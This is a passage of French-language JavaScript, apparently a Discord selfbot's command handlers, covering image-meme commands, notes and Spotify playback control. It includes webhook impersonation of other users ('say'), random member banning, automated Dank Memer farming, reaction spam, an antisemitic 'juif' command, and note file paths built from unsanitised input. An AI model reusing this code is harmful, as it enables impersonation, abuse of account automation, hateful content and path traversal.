        else if (cmd.slice(0, 1).join(' ') === (prefix + "load")){
            var charge = ".";
            var chargeC = "█";
            message.edit("```[" + charge.repeat(50) + "]```").then((message) => {
                for (i = 0; i <= 50; i++) {
                    message.edit("```[" + chargeC.repeat(i) + charge.repeat(50 - i) + "]  -  " + i * 100 / 50 + "%\n" + "loading..```");
                }
                message.edit(`ガ __**${name} - Load**__ ガ\n> *Chargement terminé*`)
            })
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "troll")){
            message.edit(`ガ __**${name} - Facepalm**__ ガ\n░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄
            ░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄
            ░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█
            ░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░█
            ░▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░█
            █▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒█
            █▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█
            ░█▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
            ░░█░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
            ░░░█░░██░░▀█▄▄▄█▄▄█▄████░█
            ░░░░█░░░▀▀▄░█░░░█░███████░█
            ░░░░░▀▄░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
            ░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░█
            ░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░█
            ░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░█`.replaceAll("            ", ""))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "biffle")){
            message.edit({content: `ガ __**${name} - ${client.user.username} 𝐭𝐞 𝐛𝐢𝐟𝐟𝐥𝐞 𝐬𝐚𝐥𝐨𝐩𝐞**__ ガ\n${api.biffle}`})
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "h4x0r")){
            message.edit({content: `ガ __**${name} - H4X0R DETECTED**__ ガ\n${api.haxor}`})
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "bontoutou")){
            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || message.author
            message.edit({content: `ガ __**${name} - ${user.username}  tu es un Bon toutou**__ ガ\n${api.bontoutou}`})
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "8ball")){
            if (!args[0]) return message.edit(`ガ __**${name} - 8Ball**__ ガ\n> *Veuillez entrer un texte*`)
            message.edit(`ガ __**${name} - 8Ball**__ ガ\n> \`Question\` ${client.separator} **${args.join(' ')}**\n\`Réponse\` ${client.separator} **${api.ball[Math.round(Math.random() * (api.ball.length - 1))]}**`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "suicide")){
            let time = 1000
            let texts = [ "😭 🔫", "💥", "💀" ]

            for (const text of texts){
                message.edit(text)
                await client.sleep(time)
                time = time + 2000
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "veski")){
            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || message.author
            message.edit({content: `ガ __**${name} - ${user.username} c'est enfuit**__ ガ\n${api.veski[Math.floor(Math.random() * api.veski.length)]}`})
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "juif")){
            message.edit({content: `ガ __**${name} - Juif detecté**__ ガ\n${api.juif}`})
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "pf")){
            var pileface = ["pile", "face"]

            if (message.author?.id === client.user?.id) {
                message.edit(`ガ __**${name} - Pile Face**__ ガ\n***Je lance la piece.***`)
                message.edit(`ガ __**${name} - Pile Face**__ ガ\n***Je lance la piece..***`)
                message.edit(`ガ __**${name} - Pile Face**__ ガ\n***Je lance la piece...***`)
                message.edit(`ガ __**${name} - Pile Face**__ ガ\n> \`Je choisis\` ${client.separator} ***${pileface[Math.floor(Math.random() * pileface.length)]}***`)
            }
        }
        else if (cmd.slice(0, 1).join(' ') === (prefix + "tweet")){
            if (!args[0]) return message.edit(`ガ __**${name} - Tweet*__ ガ\n> *Veuillez entrer un pseudo*`)
            if (!args[1]) return message.edit(`ガ __**${name} - Tweet*__ ガ\n> *Veuillez entrer un texte*`)
            
            const r = await fetch(`https://nekobot.xyz/api/imagegen?type=tweet&username=${args[0]}&text=${args.slice(1).join(' ')}`)
            const json = await r.json()

            message.edit(`ガ __**${name} - Tweet**__ ガ\n> ${json.message}`)
        }
        else if (cmd.slice(0, 1).join(' ') === (prefix + "changemind")){
            if (!args[0]) return message.edit(`ガ __**${name} - Change Mind*__ ガ\n> *Veuillez entrer un texte*`)
            const r = await fetch(`https://nekobot.xyz/api/imagegen?type=changemymind&text=${args.join(' ')}`)
            const json = await r.json()

            message.edit(`ガ __**${name} - Change Mind**__ ガ\n> ${json.message}`)
        }
        else if (cmd.slice(0, 1).join(' ') === (prefix + "clyde")){
            if (!args[0]) return message.edit(`ガ __**${name} - Clyde*__ ガ\n> *Veuillez entrer un texte*`)
            const r = await fetch(`https://nekobot.xyz/api/imagegen?type=clyde&text=${args.join(' ')}`)
            const json = await r.json()

            message.edit(`ガ __**${name} - Clyde**__ ガ\n> ${json.message}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "massreact")){
            const m = await message.channel.messages.fetch(args[0] || 0)
            if (!m) return message.edit(`ガ __**${name} - Mass React*__ ガ\n> *Veuillez entrer une ID de message*`)    
            message.delete()

            const rand = ['☺', '😊', '😀', '😁', '😂', '😃', '😄', '😅', '😆', '😇', '😈', '😉', '😯', '😐', '😑', '😕', '😠', '😬', '😡', '😢', '😴', '😮', '😣', '😥', '😦', '😧', '😨', '😩', '😰', '😟', '😱', '😲', '😳', '😵', '😶', '😷', '😞', '😒', '😍', '😛', '😜', '😝', '😋', '😗', '😙', '😘', '😚', '😎', '😭', '😌', '😖', '😔', '😪', '😏', '😓', '😫', '🙋', '🙌', '🙍', '🙅', '🙆', '🙇', '🙎', '🙏', '😺', '😼', '😸', '😹', '😻', '😽', '😿', '😾', '🙀', '🙈', '🙉', '🙊', '👶', '👦', '👧', '👨', '👩', '👴', '👵', '👮', '👷', '💁', '💂', '👯', '👰', '👸', '🎅', '👼', '👱', '👲', '👳', '💆', '👻', '👹', '👺', '💀', '👽', '👾', '👿', '💇', '👀', ]

            for (let i = 0; i < 24; i++){
                if (m) m.react(rand[i]).catch(() => false)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "banroulette")){
            if (!message.guild) return message.edit(`ガ __**${name} - Ban Roulette**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("BAN_MEMBERS")) return message.edit(`ガ __**${name} - Ban Roulette*__ ガ\n> *Vous n'avez pas les permissions nécéssaires pour utiliser cette commande*`)    

            const member = message.guild.members.cache.filter(m => m.bannable).random()
            if (!member) return message.edit(`ガ __**${name} - Ban Roulette**__ ガ\n> *Aucun membre de trouvé*`)
            member.ban().then(() => message.edit(`ガ __**${name} - Ban Roulette**__ ガ\n> *${member.user.username} a été banni*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "undertale")){
            if (!args[0]) return message.edit(`ガ __**${name} - Undertale**__ ガ\n> *Veuillez entrer un texte valide*`)
            message.edit(`ガ __**${name} - Undertale**__ ガ\n> *https://www.demirramon.com/gen/undertale_text_box.png?text=${encodeURIComponent(args.join(' '))} *`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "say")){
            if (!message.guild) return message.edit(`ガ __**${name} - Say**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_WEBHOOKS")) return message.edit(`ガ __**${name} - Say*__ ガ\n> *Vous n'avez pas les permissions nécéssaires pour utiliser cette commande*`)    
            if (!args[1]) return message.edit(`ガ __**${name} - Say*__ ガ\n> *Veuillez entrer un texte valide*`)    
            
            let user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!args[0] || !user) user = message.author

            message.delete().catch(() => false)

            let webhooks = await message.guild.fetchWebhooks()
            let webhook = webhooks?.first()

            if (!webhook) webhook = await message.channel.createWebhook(user.username, { avatar: user.displayAvatarURL({dynamic: true}) }).catch(() => false)
            webhook.send({content: args.slice(1).join(' '), username: user.username, avatarURL: user.displayAvatarURL({dynamic: true})}).catch(() => false)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "dfarmer")){
            const commands = [ "pls hunt", "pls search", "pls fish", "pls beg", "pls pm", "pls dep all" ]

            if (args[0] === "stop"){
                if (client.interval["dfarmer"]) clearInterval(client.interval["dfarmer"])
                return message.edit(`ガ __**${name} - Dank Memer Farmer**__ ガ\n> *Le farming a été arrêté*`)
            }
            else {
                message.delete()
                if (client.interval["dfarmer"]) clearInterval(client.interval["dfarmer"])
                client.interval["dfarmer"] = setInterval(async () => {
                    for (let i = 0; i < commands.length; i++){
                        message.channel.sendTyping()
                        message.channel.send(commands[i])
                        await client.sleep(5000)
                    }
                }, 15000);    
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "react")){
            const channelMessages = await message.channel.messages.fetch(args[0] || 0)
            if (!channelMessages) return message.edit(`ガ __**${name} - React**__ ガ\n> *Veuillez préciser une ID de message*`)
            message.delete()

            const letters = transformText(args.slice(1).join(' '))
            for (const lettre of letters){
                channelMessages.react(lettre).catch(() => false)
            }
        }











        else if (cmd.slice(0, 1).join(' ') === (prefix + "gsearch")){
            if (!args[0] || !args[0].startsWith("http")) return message.edit(`ガ __**${name} - Google Search**__ ガ\n> Veuillez entrer une URL à chercher`)
            return message.edit(`ガ __**${name} - Google Search**__ ガ\n> https://lens.google.com/uploadbyurl?url=${encodeURIComponent(args[0])}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gavatar")){
            let user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0])
            if (!args[0]) user = message.author
            if (!user) return message.edit(`ガ __**${name} - Google Search**__ ガ\n> *Veuillez mentionner un utilisateur*`)
            return message.edit(`ガ __**${name} - Google Search**__ ガ\n> https://lens.google.com/uploadbyurl?url=${encodeURIComponent(user.avatarURL({dynamic: true}))}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "senddog")){
            const r = await fetch("https://dog.ceo/api/breeds/image/random")
            const res = await r.json()
            return message.edit(`ガ __**${name} - Send Dog**__ ガ\n> ${res.message}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "sendfox")){
            const r = await fetch("https://randomfox.ca/floof/")
            const res = await r.json()
            return message.edit(`ガ __**${name} - Send Fox**__ ガ\n> ${res.image}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "sendcat")){
            const r = await fetch("https://api.thecatapi.com/v1/images/search")
            const res = await r.json()
            return message.edit(`ガ __**${name} - Send Cat**__ ガ\n> ${res[0].url}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "sadcat")){
            const r = await fetch("https://api.alexflipnote.dev/sadcat")
            const res = await r.json()
            return message.edit(`ガ __**${name} - Sad Cat**__ ガ\n> ${res.file}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "biden")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!args[0]) return message.edit(`ガ __**${name} - Biden**__ ガ\n> Veuillez entrer un texte valide`)
            return message.edit(`ガ __**${name} - Biden**__ ガ\n> https://api.popcat.xyz/biden?text=${encodeURIComponent(args.join(' '))}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "pikachu")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!args[0]) return message.edit(`ガ __**${name} - Pikachu**__ ガ\n> Veuillez entrer un texte valide`)
            return message.edit(`ガ __**${name} - Pikachu**__ ガ\n> https://api.popcat.xyz/pikachu?text=${encodeURIComponent(args.join(' '))}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "stonks")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            let user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0])
            if (!args[0]) user = message.author
            if (!user) return message.edit(`ガ __**${name} - Stonks**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            return message.edit(`ガ __**${name} - Stonks**__ ガ\n> https://vacefron.nl/api/stonks?user=${encodeURIComponent(user.avatarURL({dynamic: true}))}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "notstonks")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            let user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0])
            if (!args[0]) user = message.author
            if (!user) return message.edit(`ガ __**${name} - Not Stonks**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            return message.edit(`ガ __**${name} - Not Stonks**__ ガ\n> https://vacefron.nl/api/stonks?user=${encodeURIComponent(user.avatarURL({dynamic: true}))}&notstonks=true`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "amongus")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!args[0]) return message.edit(`ガ __**${name} - Among Us**__ ガ\n> Veuillez entrer un texte valide`)
            return message.edit(`ガ __**${name} - Among Us**__ ガ\n> https://vacefron.nl/api/emergencymeeting?text=${encodeURIComponent(args.join(' '))}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "drip")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            let user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0])
            if (!args[0]) user = message.author
            if (!user) return message.edit(`ガ __**${name} - Drip**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            return message.edit(`ガ __**${name} - Drip**__ ガ\n> https://vacefron.nl/api/drip?user=${encodeURIComponent(user.avatarURL({dynamic: true}))}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gun")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            let user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0])
            if (!args[0]) user = message.author
            if (!user) return message.edit(`ガ __**${name} - Gun**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            return message.edit(`ガ __**${name} - Gun**__ ガ\n> https://api.popcat.xyz/gun?image=${encodeURIComponent(user.avatarURL({dynamic: true}))}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "ad")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            let user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0])
            if (!args[0]) user = message.author
            if (!user) return message.edit(`ガ __**${name} - Ad**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            return message.edit(`ガ __**${name} - Ad**__ ガ\n> https://api.popcat.xyz/ad?image=${encodeURIComponent(user.avatarURL({dynamic: true}))}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "alert")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!args[0]) return message.edit(`ガ __**${name} - Alert**__ ガ\n> Veuillez entrer un texte valide`)

            return message.edit(`ガ __**${name} - Alert**__ ガ\n> https://api.popcat.xyz/alert?text=${encodeURIComponent(args.join(' '))}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "caution")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!args[0]) return message.edit(`ガ __**${name} - Caution**__ ガ\n> Veuillez entrer un texte valide`)

            return message.edit(`ガ __**${name} - Caution**__ ガ\n> https://api.popcat.xyz/caution?text=${encodeURIComponent(args.join(' '))}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "heaven")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            let user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0])
            if (!args[0]) user = message.author
            if (!user) return message.edit(`ガ __**${name} - Heaven**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            return message.edit(`ガ __**${name} - Heaven**__ ガ\n> https://vacefron.nl/api/heaven?user=${encodeURIComponent(user.avatarURL({dynamic: true}))}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "dockofshame")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            let user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0])
            if (!args[0]) user = message.author
            if (!user) return message.edit(`ガ __**${name} - Dock of Shame**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            return message.edit(`ガ __**${name} - Dock of Shame**__ ガ\n> https://vacefron.nl/api/dockofshame?user=${encodeURIComponent(user.avatarURL({dynamic: true}))}`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "first time")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            let user = message.mentions.users.first() || client.users.cache.get(args[1]) || await client.users.fetch(args[1])
            if (!args[1]) user = message.author
            if (!user) return message.edit(`ガ __**${name} - First Time**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            return message.edit(`ガ __**${name} - First Time**__ ガ\n> https://vacefron.nl/api/firsttime?user=${encodeURIComponent(user.avatarURL({dynamic: true}))}`)
        }


        else if (cmd.slice(0, 1).join(' ') === (prefix + "iq")){
            let text;
            const iq = Math.round(Math.random() * 200);

            if (iq > 120) text = "t'es un génie"
            if (iq < 120) text = "t'es dans la moyenne"
            if (iq < 90) text = "ça va sah"
            if (iq < 50) text = "t'es un ptit débile"

            let user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!args[0]) user = message.author
            if (!user) return message.edit(`ガ __**${name} - IQ**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            return message.edit(`ガ __**${name} - IQ**__ ガ\n> Le QI de ${user.username} (${text})`)
        }
        








        else if (cmd.slice(0, 2).join(' ') === (prefix + "create note")){
            if (!args[1]) return message.edit(`ガ __**${name} - Note**__ ガ\n> *Veuillez entrer un nom de note*`)
            if (fs.existsSync(`${__dirname}/Data/Notes/${args[1]}.txt`)) return message.edit(`ガ __**${name} - Note**__ ガ\n> *Une note avec ce nom existe déjà*`)

            if (!args[2]) return message.edit(`ガ __**${name} - Note**__ ガ\n> *Veuillez entrer un contenue de note*`)
            fs.writeFileSync(`${__dirname}/Data/Notes/${args[1]}.txt`, args.slice(2).join(' '))

            message.edit(`ガ __**${name} - Note**__ ガ\n> *La note a été crée avec succès*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "edit note")){
            if (!args[1]) return message.edit(`ガ __**${name} - Note**__ ガ\n> *Veuillez entrer un nom de note*`)
            if (!fs.existsSync(`${__dirname}/Data/Notes/${args[1]}.txt`)) return message.edit(`ガ __**${name} - Note**__ ガ\n> *Aucune note avec ce nom n'a été trouvée*`)

            if (!args[2]) return message.edit(`ガ __**${name} - Note**__ ガ\n> *Veuillez entrer un contenue de note*`)
            fs.writeFileSync(`${__dirname}/Data/Notes/${args[1]}.txt`, args.slice(2).join(' '))

            message.edit(`ガ __**${name} - Note**__ ガ\n> *La note a été modifiée avec succès*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "delete note")){
            if (!args[1]) return message.edit(`ガ __**${name} - Note**__ ガ\n> *Veuillez entrer un nom de note*`)
            if (!fs.existsSync(`${__dirname}/Data/Notes/${args[1]}.txt`)) return message.edit(`ガ __**${name} - Note**__ ガ\n> *Aucune note avec ce nom n'a été trouvée*`)

            fs.unlinkSync(`${__dirname}/Data/Notes/${args[1]}.txt`)
            message.edit(`ガ __**${name} - Note**__ ガ\n> *La note a été supprimée avec succès*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "list note")){
            if (!args[1]) return message.edit(`ガ __**${name} - Note**__ ガ\n> *Veuillez entrer un nom de note*`)
            if (!fs.existsSync(`${__dirname}/Data/Notes/${args[1]}.txt`)) return message.edit(`ガ __**${name} - Note**__ ガ\n> *Aucune note avec ce nom n'a été trouvée*`)

            const filesName = fs.readdirSync(`${__dirname}/Data/Notes`).filter(file => file.endsWith(".txt"))
            message.edit(`ガ __**${name} - Note**__ ガ\n>>> ${filesName.length === 0 ? "*Aucune note*" : filesName.map(name => name.replace(".txt", "")).join('\n')}`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "show note")){
            if (!args[1]) return message.edit(`ガ __**${name} - Note**__ ガ\n> *Veuillez entrer un nom de note*`)
            if (!fs.existsSync(`${__dirname}/Data/Notes/${args[1]}.txt`)) return message.edit(`ガ __**${name} - Note**__ ガ\n> *Aucune note avec ce nom n'a été trouvée*`)

            if (!args[2]) return message.edit(`ガ __**${name} - Note**__ ガ\n> *Veuillez entrer un contenue de note*`)
            const content = fs.readFileSync(`${__dirname}/Data/Notes/${args[1]}.txt`)
            message.edit(`ガ __**${name} - Note**__ ガ\n\`\`\`${content}\`\`\``)
        }























        else if (cmd.slice(0, 1).join(' ') === (prefix + "playsong")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (client.user.connectedAccounts.filter(a => a.type === "spotify").length === 0) return message.edit(`ガ __**${name} - Spotify Play**__ ガ\n> *Veuillez lier un compte spotify à discord*`)
            if (!args[0]) return message.edit(`ガ __**${name} - Spotify Play**__ ガ\n> *Veuillez entrer un nom de musique à jouer*`)
            
            const r = await fetch(`https://api.spotify.com/v1/search?type=track&limit=1&q=${encodeURIComponent(args.join(' '))}`, {method: "get", headers: {authorization: `Bearer ${client.user.connectedAccounts.filter(a => a.type === "spotify")[0].access_token}`}})
            const res = await r.json()
            
            if (res.error?.status === 401) return message.edit(`ガ __**${name} - Spotify Play**__ ガ\n> *Le token d'accès à spotify a expiré*`)
            if (res.tracks.total === 0) return message.edit(`ガ __**${name} - Spotify Play**__ ガ\n> *Aucune musique n'a été trouvée*`)

            const uri = res.tracks.items[0].uri
            fetch(`https://api.spotify.com/v1/me/player/play`, {method: "PUT", body: JSON.stringify({uris: [uri]}, null, 4), headers: {authorization: `Bearer ${client.user.connectedAccounts.filter(a => a.type === "spotify")[0].access_token}`}})
            .then(async (res) => {
                message.edit(`ガ __**${name} - Spotify Play**__ ガ\n> *J'ai changé la musique*`)
            })
            .catch(() => message.edit(`ガ __**${name} - Spotify Play**__ ガ\n> *Je n'ai pas pu changer la musique*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "addqueue")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (client.user.connectedAccounts.filter(a => a.type === "spotify").length === 0) return message.edit(`ガ __**${name} - Spotify Add Queue**__ ガ\n> *Veuillez lier un compte spotify à discord*`)
            if (!args[0]) return message.edit(`ガ __**${name} - Spotify Add Queue**__ ガ\n> *Veuillez entrer un nom de musique à jouer*`)
            
            const r = await fetch(`https://api.spotify.com/v1/search?type=track&limit=1&q=${encodeURIComponent(args.join(' '))}`, {method: "get", headers: {authorization: `Bearer ${client.user.connectedAccounts.filter(a => a.type === "spotify")[0].access_token}`}})
            const res = await r.json()
            
            if (res.error?.status === 401) return message.edit(`ガ __**${name} - Spotify Add Queue**__ ガ\n> *Le token d'accès à spotify a expiré*`)
            if (res.tracks.total === 0) return message.edit(`ガ __**${name} - Spotify Add Queue**__ ガ\n> *Aucune musique n'a été trouvée*`)

            const uri = res.tracks.items[0].uri
            fetch(`https://api.spotify.com/v1/me/player/queue?uri=${encodeURIComponent(uri)}`, {method: "POST", headers: {authorization: `Bearer ${client.user.connectedAccounts.filter(a => a.type === "spotify")[0].access_token}`}})
            .then(async (res) => {
                message.edit(`ガ __**${name} - Spotify Add Queue**__ ガ\n> *J'ai ajoutée une musique dans la queue*`)
            })
            .catch(() => message.edit(`ガ __**${name} - Spotify Add Queue**__ ガ\n> *Je n'ai pas pu ajoutée une musique dans la queue*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "queue")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (client.user.connectedAccounts.filter(a => a.type === "spotify").length === 0) return message.edit(`ガ __**${name} - Spotify Queue**__ ガ\n> *Veuillez lier un compte spotify à discord*`)
            
            const r = await fetch(`https://api.spotify.com/v1/me/player/queue`, {method: "get", headers: {authorization: `Bearer ${client.user.connectedAccounts.filter(a => a.type === "spotify")[0].access_token}`}})
            const res = await r.json()
            console.log(res)
            if (res.error?.status === 401) return message.edit(`ガ __**${name} - Spotify Queue**__ ガ\n> *Le token d'accès à spotify a expiré*`)
            if (res.queue?.length === 0) return message.edit(`ガ __**${name} - Spotify Queue**__ ガ\n> *Aucune musique dans la queue*`)

                message.edit(`ガ __**${name} - Spotify Queue**__ ガ\n>>> ${res.queue.map((o, i) => `\`${i+1}\` - ${o.name}`).join('\n')}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "playing")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (client.user.connectedAccounts.filter(a => a.type === "spotify").length === 0) return message.edit(`ガ __**${name} - Spotify Playing**__ ガ\n> *Veuillez lier un compte spotify à discord*`)

            fetch(`https://api.spotify.com/v1/me/player/currently-playing`, {method: "get", headers: {authorization: `Bearer ${client.user.connectedAccounts.filter(a => a.type === "spotify")[0].access_token}`}})
            .then(async (res) => {
                const r = await res.json().catch(() => false)

                if (res.error?.status === 401) return message.edit(`ガ __**${name} - Spotify Add Queue**__ ガ\n> *Le token d'accès à spotify a expiré*`)

                if (!r || !r.item) return message.edit(`ガ __**${name} - Spotify Playing**__ ガ\n> *Vous ne jouez aucune musique*`)
                message.edit(`ガ __**${name} - Spotify Playing**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}Nom${client.tools === "k3s" ? "" : "\`"}${client.separator}**${r.item.name}**\n${client.tools === "k3s" ? "" : "\`"}Artists${client.tools === "k3s" ? "" : "\`"}${client.separator}${r.item.artists.map(r => r.name).join(', ')}\n${client.tools === "k3s" ? "" : "\`"}Lien${client.tools === "k3s" ? "" : "\`"}${client.separator}**${r.item.external_urls?.spotify || "Aucun"}**`)
            })
            .catch(() => message.edit(`ガ __**${name} - Spotify Playing**__ ガ\n> *Impossible de trouver la musique*`))
        
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "volume")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (client.user.connectedAccounts.filter(a => a.type === "spotify").length === 0) return message.edit(`ガ __**${name} - Spotify Volume**__ ガ\n> *Veuillez lier un compte spotify à discord*`)
            
            if (!args[0] || isNaN(parseInt(args[0])) || parseInt(args[0]) < 0 || parseInt(args[0]) > 100) return message.edit(`ガ __**${name} - Spotify Volume**__ ガ\n> *Veuillez entrer un volume entre 0 et 100*`)
            
            fetch(`https://api.spotify.com/v1/me/player/volume?volume_percent=${parseInt(args[0])}`, {method: "put", headers: {authorization: `Bearer ${client.user.connectedAccounts.filter(a => a.type === "spotify")[0].access_token}`}})
            .then(() => message.edit(`ガ __**${name} - Spotify Volume**__ ガ\n> *Le volume a été modifié*`))
            .catch(() => message.edit(`ガ __**${name} - Spotify Volume**__ ガ\n> *Je n'ai pas pu modifier le volume*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "repeat")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (client.user.connectedAccounts.filter(a => a.type === "spotify").length === 0) return message.edit(`ガ __**${name} - Spotify Repeat**__ ガ\n> *Veuillez lier un compte spotify à discord*`)
            
            if (args[0] === "off"){
                fetch(`https://api.spotify.com/v1/me/player/repeat/repeat?state=off`, {method: "put", headers: {authorization: `Bearer ${client.user.connectedAccounts.filter(a => a.type === "spotify")[0].access_token}`}})
                .then(() => message.edit(`ガ __**${name} - Spotify Repeat**__ ガ\n> *La répétition de la playlist été retirée*`))
                .catch(() => message.edit(`ガ __**${name} - Spotify Repeat**__ ガ\n> *Je n'ai pas pu retirer la répétition de la playlist*`))    
            }

            else {
                fetch(`https://api.spotify.com/v1/me/player/repeat/repeat?state=context`, {method: "put", headers: {authorization: `Bearer ${client.user.connectedAccounts.filter(a => a.type === "spotify")[0].access_token}`}})
                .then(() => message.edit(`ガ __**${name} - Spotify Repeat**__ ガ\n> *La répétition de la playlist été activée*`))
                .catch(() => message.edit(`ガ __**${name} - Spotify Repeat**__ ガ\n> *Je n'ai pas pu activer la répétition de la playlist*`))    
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "shuffle")){
